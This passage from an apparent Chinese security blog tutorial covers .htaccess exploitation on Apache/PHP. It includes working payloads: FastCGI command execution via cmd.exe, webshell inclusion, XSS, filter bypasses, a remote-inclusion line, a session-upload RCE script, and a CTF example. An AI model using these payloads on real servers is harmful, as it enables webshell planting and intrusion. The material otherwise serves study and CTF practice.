我们再来看看FastCGI模式的，这个依赖的是mod_fcgid.so，默认安装包里甚至没有这个so文件，不过在PHPStudy的默认配置中，就已经是加载了的，并且AllowOverride也是All权限，手动斜眼。</p><p>​    其实还有mod_proxy_fcgi，更为常见，也是默认开启的，还不清楚能否利用，表哥表姐们可以尝试一下。</p><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><blockquote><p>1.AllowOverride all或AllowOverride Options FileInfo。</p><p>2.mod_fcgid.so被加载。即apache配置文件中有LoadModule fcgid_module modules/mod_fcgid.so</p><p>3.有目录的上传、写入权限。</p></blockquote><h4 id="利用姿势-1"><a href="#利用姿势-1" class="headerlink" title="利用姿势"></a>利用姿势</h4><p>上传.htaccess  文件, 内容如下：</p><div class="hljs code-wrapper"><pre><code class="hljs dos">Options +ExecCGIAddHandler fcgid-script .abcFcgidWrapper &quot;C:/Windows/System32/<span class="hljs-built_in">cmd</span>.exe /c <span class="hljs-built_in">start</span> <span class="hljs-built_in">cmd</span>.exe&quot; .abc</code></pre></div><p>老样子，如果默认就开启了ExecCGI，则第一句可以省略。</p><p>第二句表示，abc后缀名的文件需要被fcgi来解析。AddHandler还可以换成AddType。</p><p>再上传1.abc。内容无所谓。</p><h3 id="proxy-fcgi启动方式RCE利用"><a href="#proxy-fcgi启动方式RCE利用" class="headerlink" title="proxy_fcgi启动方式RCE利用"></a>proxy_fcgi启动方式RCE利用</h3><h3 id="使用相对路径"><a href="#使用相对路径" class="headerlink" title="使用相对路径"></a>使用相对路径</h3><p>其实一些小伙伴也已经发现了，上面的问题再配合有上传漏洞，我甚至可以穿个马上去。但是无论是CGI还是FastCGI似乎都是绝对路径，相对路径可不可以呢？</p><p>经过了一些尝试，并请教了”裤衩哥”,发现相对路径也是可以的，起始点似乎和session.save_path变量的值是一致的。如图，比如phpstudy当中，起始点就是在\Extensions\tmp\tmp中。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1572427454_5db956be0a967.png!small" alt="image.png"></p><h4 id="1-解析成php"><a href="#1-解析成php" class="headerlink" title="1. 解析成php"></a>1. 解析成php</h4><p>那么，比如说我想要html后缀使用php来解析。就可以这样写。</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">AddHandler fcgid-script <span class="hljs-string">.html</span>FcgidWrapper <span class="hljs-string">&quot;../../php/php7.3.4nts/php-cgi.exe&quot;</span> <span class="hljs-string">.html</span></code></pre></div><p>再来，我想调用网站根目录的calc.exe。可以这样。</p><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">AddHandler fcgid-script <span class="hljs-string">.xx</span>FcgidWrapper <span class="hljs-string">&quot;../../../WWW/localhost/calc.exe&quot;</span> <span class="hljs-string">.xx</span></code></pre></div><p>不过计算器无法正常弹出。23333 我猜应该是因为calc毕竟不是个标准CGI程序导致的吧。而且也没必要绕这么大个圈子，就没继续测试了。</p><h3 id="AddType-文件类型解析利用"><a href="#AddType-文件类型解析利用" class="headerlink" title="AddType 文件类型解析利用"></a>AddType 文件类型解析利用</h3><h4 id="1-解析成php-1"><a href="#1-解析成php-1" class="headerlink" title="1. 解析成php"></a>1. 解析成php</h4><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .a</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911085755821.png" alt="image-20200911085755821"></p><h4 id="2-php-value-配置选项利用"><a href="#2-php-value-配置选项利用" class="headerlink" title="2. php_value 配置选项利用"></a>2. php_value 配置选项利用</h4><p>这种方式可通过<code>php_value</code>来配置PHP的配置选项；</p><p>查看<a href="https://www.php.net/manual/zh/configuration.changes.modes.php">配置可被设定的范围</a>：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0142ecdfc9bc4dea2c.png" alt="img"></p><p>从上图可知，.htaccess可以使两种配置模式生效：<code>PHP_INI_PREDIR</code>和<code>PHP_INI_ALL</code></p><p>可查看<a href="https://www.php.net/manual/zh/ini.list.php">php.ini配置选项列表</a>，从中寻找可利用的配置项</p><h5 id="2-1-使用文件包含的两个相关配置"><a href="#2-1-使用文件包含的两个相关配置" class="headerlink" title="2.1 使用文件包含的两个相关配置"></a>2.1 使用文件包含的两个相关配置</h5><ul><li><code>auto_prepend_file</code>：指定一个文件，在主文件解析之前自动解析</li><li><code>auto_append_file</code>：指定一个文件，在主文件解析后自动解析</li></ul><p>编辑.htaccess，内容为：</p><div class="hljs code-wrapper"><pre><code class="hljs angelscript">php_value <span class="hljs-built_in">auto</span>_prepend_file webshell</code></pre></div><p>编辑<code>webshell</code>，内容为：</p><div class="hljs code-wrapper"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span>phpinfo();</code></pre></div><p>此时随便找一个php文件访问：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01bd4392c622f18276.png" alt="img"></p><p><strong>然后就是各种文件包含的操作</strong></p><p>由于通过设置这两个选项进行文件包含，那么便可使用相关的php协议流，如<code>php://filter</code>，可用来绕过对一些关键字的检测</p><h5 id="2-2-绕过preg-match利用"><a href="#2-2-绕过preg-match利用" class="headerlink" title="2.2 绕过preg_match利用"></a>2.2 绕过preg_match利用</h5><p>查看官方文档中的相关配置：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01e72385d9b9ab2b2d.png" alt="img"></p><p>编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span></code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01c94eb522a6e0f5ca.png" alt="img"></p><h3 id="使-htaccess文件可访问"><a href="#使-htaccess文件可访问" class="headerlink" title="使.htaccess文件可访问"></a>使.htaccess文件可访问</h3><p>默认情况下，.htaccess是不可访问的：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01cac6209710b84ed5.png"></p><p>那么编辑.htaccess文件，添加如下配置：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;Files ~ <span class="hljs-string">&quot;^.ht&quot;</span>&gt;</span>    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> granted    <span class="hljs-attribute"><span class="hljs-nomarkup">Order</span></span> <span class="hljs-literal">allow</span>,<span class="hljs-literal">deny</span>    <span class="hljs-attribute"><span class="hljs-nomarkup">Allow</span></span> from <span class="hljs-literal">all</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01a24ca8a58e2fa4ec.png" alt="img"></p><h3 id="htaccess-shell-与-XSS"><a href="#htaccess-shell-与-XSS" class="headerlink" title=".htaccess shell 与 XSS"></a>.htaccess shell 与 XSS</h3><p>例如下面这个.htaccess文件，首先设置了禁用拒绝规则，这样便可直接访问到.htaccess；接着用<code>SetHandler</code>将所有文件作为php解析，最后写入php代码，开头用<code>#</code>注释掉，这样便可成功解析.htaccess，然后解析php：</p><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Files</span> ~ &quot;^<span class="hljs-attr">.ht</span>&quot;&gt;</span> Require all granted Order allow,deny Allow from all<span class="hljs-tag">&lt;/<span class="hljs-name">Files</span>&gt;</span>SetHandler application/x-httpd-php# &lt;?php phpinfo(); ?&gt;</code></pre></div><p>相关的关于.htaccess的shell，可参考github上一个项目：里面有各种语言的shell。</p><p><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a></p><h4 id="php-code-execution"><a href="#php-code-execution" class="headerlink" title="php code execution"></a>php code execution</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs php-template"><span class="xml">php_value auto_append_file .htaccess</span><span class="xml">#</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();</span></code></pre></div><h4 id="direct-remote-file-inclusion（不可用）"><a href="#direct-remote-file-inclusion（不可用）" class="headerlink" title="(direct/remote) file inclusion（不可用）"></a>(direct/remote) file inclusion（不可用）</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs lasso">php_flag allow_url_include <span class="hljs-number">1</span>php_value auto_append_file <span class="hljs-built_in">data</span>:<span class="hljs-comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span>#php_value auto_append_file <span class="hljs-built_in">data</span>:<span class="hljs-comment">//text/plain,%3C%3Fphp+phpinfo%28%29%3B</span>#php_value auto_append_file https:<span class="hljs-comment">//sektioneins.de/evil-code.txt</span></code></pre></div><p>打开allow_url_include 后，可以直接远程文件包含，也可以用data协议getshell</p><p><strong>查阅文档后发现allow_url_include不可用htaccess来进行修改</strong></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912102329350.png" alt="image-20200912102329350"></p><p>此项无效</p><h4 id="XSS-and-PHP-code-execution-with-UTF-7"><a href="#XSS-and-PHP-code-execution-with-UTF-7" class="headerlink" title="XSS and PHP code execution with UTF-7"></a>XSS and PHP code execution with UTF-7</h4><p>index.php: (empty)</p><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">php_flag zend.<span class="hljs-keyword">multibyte </span><span class="hljs-number">1</span>php_value zend.<span class="hljs-keyword">script_encoding </span><span class="hljs-string">&quot;UTF-7&quot;</span>php_value auto_append_file .htaccess<span class="hljs-comment">#+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4 #+ADw?php phpinfo()+ADs</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912102552476.png" alt="image-20200912102552476"></p><p><code>+ADw-script+AD4-alert(1)+ADsAPA-/script+AD4</code></p><p>解码后为</p><p><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p><h4 id="XSS-via-error-message-link-extension"><a href="#XSS-via-error-message-link-extension" class="headerlink" title="XSS via error message link extension"></a>XSS via error message link extension</h4><p>index.php:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;foo&#x27;</span>);</code></pre></div><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> display_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_flag</span> html_errors <span class="hljs-number">1</span><span class="hljs-attribute">php_value</span> docref_root <span class="hljs-string">&quot;x&quot;</span><span class="hljs-attribute">php_value</span> docref_ext <span class="hljs-string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span></code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912103938003.png" alt="image-20200912103938003"></p><h4 id="XSS-via-highlight-file-color"><a href="#XSS-via-highlight-file-color" class="headerlink" title="XSS via highlight_file() color"></a>XSS via highlight_file() color</h4><p>index.phps:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">// comment</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs xml">php_value highlight.comment &#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200912103730890.png" alt="image-20200912103730890"></p><h4 id="Source-code-disclosure（直接查看源码）"><a href="#Source-code-disclosure（直接查看源码）" class="headerlink" title="Source code disclosure（直接查看源码）"></a>Source code disclosure（直接查看源码）</h4><p>.htaccess:</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_flag</span> engine <span class="hljs-number">0</span></code></pre></div><h2 id="0x06-Bypass方式"><a href="#0x06-Bypass方式" class="headerlink" title="0x06 Bypass方式"></a>0x06 Bypass方式</h2><h3 id="1-关键字检测"><a href="#1-关键字检测" class="headerlink" title="1.关键字检测"></a>1.关键字检测</h3><h4 id="1-1-过滤了-htaccess常用的关键字"><a href="#1-1-过滤了-htaccess常用的关键字" class="headerlink" title="1.1 过滤了.htaccess常用的关键字"></a>1.1 过滤了.htaccess常用的关键字</h4><p>如果过滤了.htaccess常用的关键字，此时可以使用反斜线来绕过对关键字的过滤，反斜线后需要加上换行符，并且反斜线前和关键字无空格</p><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddT\ype <span class="hljs-built_in">application</span>/x-httpd-php .abc</code></pre></div><h4 id="1-2-过滤了-lt-等php字符串"><a href="#1-2-过滤了-lt-等php字符串" class="headerlink" title="1.2 过滤了&lt;?等php字符串"></a>1.2 过滤了<code>&lt;?</code>等php字符串</h4><p>如果检测不能含有<code>&lt;?</code>等php字符串，那么此时可先将shell字符串进行编码，然后在文件包含时通过<code>php://filter</code>解码：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0131a681178bf98a67.png" alt="img"></p><div class="hljs code-wrapper"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-decode/</span>resource=<span class="hljs-number">2</span>.abc</code></pre></div><p>也可以直接写在htaccess文件中</p><div class="hljs code-wrapper"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .wuwuphp_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</span></code></pre></div><h4 id="1-3-直接进行其他编码"><a href="#1-3-直接进行其他编码" class="headerlink" title="1.3 直接进行其他编码"></a>1.3 直接进行其他编码</h4><p>通过UTF-7、UTF-16等进行编码</p><p><a href="https://p1.ssl.qhimg.com/t01c5a05b61a6155478.png"><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t01c5a05b61a6155478.png" alt="img"></a></p><p>编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs stylus">AddType application/x-httpd-php .aaaphp_flag zend<span class="hljs-selector-class">.multibyte</span> <span class="hljs-number">1</span>php_value zend<span class="hljs-selector-class">.script_encoding</span> <span class="hljs-string">&quot;UTF-7&quot;</span></code></pre></div><p>之后将后缀<code>.aaa</code>文件的内容进行相应编码即可</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911104400025.png" alt="image-20200911104400025"></p><p>实际上文件包含会直接进行解码</p><p>不使用上述配置一样可行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911104751138.png" alt="image-20200911104751138"></p><h4 id="1-4-拼接无用字符"><a href="#1-4-拼接无用字符" class="headerlink" title="1.4 拼接无用字符"></a>1.4 拼接无用字符</h4><p>可以使用<code>#</code>来注释掉后面拼接的多余内容，<code>#</code>需要和前面的内容隔一个空格，并且<code>#</code>只能注释一行内容，可以使用反斜线来转义换行符，从而注释多行内容</p><p>例如下面这个.htaccess文件是可以生效的：</p><div class="hljs code-wrapper"><pre><code class="hljs livescript">AddT<span class="hljs-string">\</span>ype application/x-httpd-php .abc <span class="hljs-comment">#\</span>asdf <span class="hljs-string">\</span>asdf</code></pre></div><p>除了<code>#</code>外，**<code>0x00</code>**也可以当注释符，使用<code>write.php</code>脚本写入.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$data</span> = urldecode(<span class="hljs-string">&#x27;AddType application/x-httpd-php .abc%0a%00asdf&#x27;</span>);file_put_contents(<span class="hljs-string">&#x27;.htaccess&#x27;</span>, <span class="hljs-variable">$data</span>);</code></pre></div><p>测试：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200911105518417.png" alt="image-20200911105518417"></p><h3 id="2-文件格式检测（绕过exif-imagetype）"><a href="#2-文件格式检测（绕过exif-imagetype）" class="headerlink" title="2. 文件格式检测（绕过exif_imagetype）"></a>2. 文件格式检测（绕过exif_imagetype）</h3><h4 id="2-1-使用XBM图像"><a href="#2-1-使用XBM图像" class="headerlink" title="2.1 使用XBM图像"></a>2.1 使用XBM图像</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 创建空白图像并添加文字</span><span class="hljs-variable">$im</span> = imagecreatetruecolor(<span class="hljs-number">120</span>, <span class="hljs-number">20</span>);<span class="hljs-variable">$text_color</span> = imagecolorallocate(<span class="hljs-variable">$im</span>, <span class="hljs-number">233</span>, <span class="hljs-number">14</span>, <span class="hljs-number">91</span>);imagestring(<span class="hljs-variable">$im</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>,  <span class="hljs-string">&#x27;A Simple Text String&#x27;</span>, <span class="hljs-variable">$text_color</span>);<span class="hljs-comment">// 保存图像</span>imagexbm(<span class="hljs-variable">$im</span>, <span class="hljs-string">&#x27;1.png&#x27;</span>);<span class="hljs-comment">// 释放内存</span>imagedestroy(<span class="hljs-variable">$im</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>(下面的<code>1_png_width</code>以及<code>1_png_height</code>是根据文件名进行拼接生成的)</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t018f3be6bcb8f72d0b.png" alt="img"></p><p>那么可以在.htaccess前面加上：</p><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> 1_png_width 120</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> 1_png_height 20</span></code></pre></div><p>便可绕过对文件格式的检测</p><h4 id="2-2-使用WBMP图像"><a href="#2-2-使用WBMP图像" class="headerlink" title="2.2 使用WBMP图像"></a>2.2 使用WBMP图像</h4><p>使用WBMP图像，使用PHP生成图像：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>);imagewbmp(<span class="hljs-variable">$img</span>, <span class="hljs-string">&#x27;1.wbmp&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>使用16进制编辑器查看：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t018eadaee755935c3a.png" alt="img"></p><p>可以看到这种图像格式是以<code>0x00</code>开头的，那么便可以此方式绕过对文件格式的检测</p><h3 id="3-session-文件包含"><a href="#3-session-文件包含" class="headerlink" title="3. session 文件包含"></a>3. session 文件包含</h3><p>若过滤了<code>&lt;</code>、数字、<code>:</code>等，此时便不能使用<code>php://filter</code>或者UTF编码的方式绕过了；可尝试利用.htaccess设置包含指定的文件。例如对于session文件，可通过包含上传文件产生的临时session进行RCE</p><p>查看配置文件，发现大部分session相关的配置都是可以通过.htaccess修改的：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/t0122f5df0960075c53.png" alt="img"></p><p>那么我们可以在不知道session存储路径的情况下，通过<code>session.save_path</code>指定存储路径，并且可以将<code>session.upload_progress.cleanup</code>设置为off，这样便可无需条件竞争来将代码写到session文件中，从而包含rce；编辑.htaccess：</p><div class="hljs code-wrapper"><pre><code class="hljs pgsql">php_value auto_append_file &quot;/tmp/sess_gtfly&quot;php_value <span class="hljs-keyword">session</span>.save_path &quot;/tmp&quot;php_flag <span class="hljs-keyword">session</span>.upload_progress.cleanup <span class="hljs-keyword">off</span></code></pre></div><p>由于关掉了cleanup，所以不用竞争了</p><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requestsurl=<span class="hljs-string">&#x27;http://127.0.0.1/test.php&#x27;</span>headers=&#123;    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&#x27;PHPSESSID=gtfly&#x27;</span>&#125;files=&#123;    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-string">&#x27;&#x27;</span>&#125;data=&#123;    <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?php echo system(&#x27;whoami&#x27;); ?&gt;&#x27;&#x27;&#x27;</span>     &#125;r = requests.session()r.post(url,files=files,headers=headers,data=data)t = r.get(<span class="hljs-string">&#x27;http://127.0.0.1/test.php&#x27;</span>,headers=headers)print(t.text)</code></pre></div><h2 id="0x06-相关例题"><a href="#0x06-相关例题" class="headerlink" title="0x06 相关例题"></a>0x06 相关例题</h2><h3 id="insomnihack——l33t-hoster"><a href="#insomnihack——l33t-hoster" class="headerlink" title="insomnihack——l33t_hoster"></a><a href="https://github.com/eboda/insomnihack">insomnihack</a>——l33t_hoster</h3><div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;source&quot;</span>]))     <span class="hljs-keyword">die</span>(highlight_file(<span class="hljs-keyword">__FILE__</span>));session_start();<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>])) &#123;    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;home&quot;</span>] = bin2hex(random_bytes(<span class="hljs-number">20</span>));&#125;<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;images/<span class="hljs-subst">&#123;$_SESSION[&quot;home&quot;]&#125;</span>/&quot;</span>;<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;    mkdir(<span class="hljs-variable">$userdir</span>);&#125;<span class="hljs-variable">$disallowed_ext</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;php&quot;</span>,    <span class="hljs-string">&quot;php3&quot;</span>,    <span class="hljs-string">&quot;php4&quot;</span>,    <span class="hljs-string">&quot;php5&quot;</span>,    <span class="hljs-string">&quot;php7&quot;</span>,    <span class="hljs-string">&quot;pht&quot;</span>,    <span class="hljs-string">&quot;phtm&quot;</span>,    <span class="hljs-string">&quot;phtml&quot;</span>,    <span class="hljs-string">&quot;phar&quot;</span>,    <span class="hljs-string">&quot;phps&quot;</span>,);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>] !== UPLOAD_ERR_OK) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;yuuuge fail&quot;</span>);    &#125;    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;image&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;        array_shift(<span class="hljs-variable">$parts</span>);    &#125;    <span class="hljs-keyword">if</span> (count(<span class="hljs-variable">$parts</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol filename is empty&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$disallowed_ext</span>, <span class="hljs-literal">TRUE</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol nice try, but im not stupid dude...&quot;</span>);    &#125;    <span class="hljs-variable">$image</span> = file_get_contents(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$image</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;why would you need php in a pic.....&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> (!exif_imagetype(<span class="hljs-variable">$tmp_name</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;not an image.&quot;</span>);    &#125;    <span class="hljs-variable">$image_size</span> = getimagesize(<span class="hljs-variable">$tmp_name</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image_size</span>[<span class="hljs-number">0</span>] !== <span class="hljs-number">1337</span> || <span class="hljs-variable">$image_size</span>[<span class="hljs-number">1</span>] !== <span class="hljs-number">1337</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;lol noob, your pic is not l33t enough&quot;</span>);    &#125;    <span class="hljs-variable">$name</span> = implode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$parts</span>);    move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>);&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;Your &lt;a href=<span class="hljs-subst">$userdir</span>&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;</span>;<span class="hljs-keyword">foreach</span>(glob(<span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;li&gt;&lt;a href=&#x27;<span class="hljs-subst">$file</span>&#x27;&gt;<span class="hljs-subst">$file</span>&lt;/a&gt;&lt;/li&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/ul&gt;&quot;</span>;<span class="hljs-meta">?&gt;</span>&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;?&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;image&quot;</span>&gt;    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=upload&gt;&lt;/form&gt;&lt;!-- /?source --&gt;<span class="hljs-number">1</span></code></pre></div><ul><li><p>文件名必须要包含<code>.</code></p></li><li><p>设置了文件后缀黑名单<code>&quot;php&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;php7&quot;,&quot;pht&quot;,&quot;phtm&quot;,&quot;phtml&quot;,&quot;phar&quot;,&quot;phps&quot;</code>,黑名单非常完善。</p><ul><li>如果文件名是通过get或post获取的，可采用<code>php\n</code>的方式绕过</li><li>如果存在<code>.htaccess</code>可以通过上传<code>.htaccess</code>达到其他后缀的效果</li><li>如果获取文件后缀的方式有问题，可以通过<code>php/.</code> 方式绕过</li></ul></li><li><p>文件内容不能包含<code>&lt;?</code></p><ul><li><p>通过php小于7.0的可以通过<code>&lt;script lanague=&#39;php&#39;&gt;</code> 绕过</p></li><li><div class="hljs code-wrapper"><pre><code class="php">7.0.0   The ASP tags &lt;%, %&gt;, &lt;%=, and the script tag &lt;script language=&quot;php&quot;&gt; are removed from PHP.5.4.0   The tag &lt;?= is always available regardless of the short_open_tag ini setting.<pre><code class="hljs awk">  - 如果能够控制文件名开头可以通过伪协议绕过：`php:<span class="hljs-regexp">//</span>filter` 等- 文件要通过`exif_imagetype`的检查  - 只检查文件头- 图片的height和width要是<span class="hljs-number">1337</span>我们需要上传.htaccess但是如下代码会进行后缀提取```php    <span class="hljs-variable">$parts</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$name</span>);    <span class="hljs-variable">$ext</span> = array_pop(<span class="hljs-variable">$parts</span>);</code></pre></div></code></pre></li></ul></li></ul><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190122212825-98708d30-1e49-1.png" alt="img"></p><p>但是后面的代码使得我们可以绕过</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-number">0</span>])) &#123;        array_shift(<span class="hljs-variable">$parts</span>);    &#125;</code></pre></div><p><strong>array_shift()</strong> 将 <code>array</code> 的第一个单元移出并作为结果返回，将 <code>array</code> 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。</p><p>filename 为..htaccess即可绕过</p><p>下一步是考虑.htaccess文件的内容</p><ul><li>exif_imagetype() 支持的magic number</li><li><code>AddType application/x-httpd-php .wuwu</code></li><li>还要能正确解析</li></ul><p>之前提到以0x00也是可以当做注释的。所以可以中找找以0x00开头的图片</p><p><a 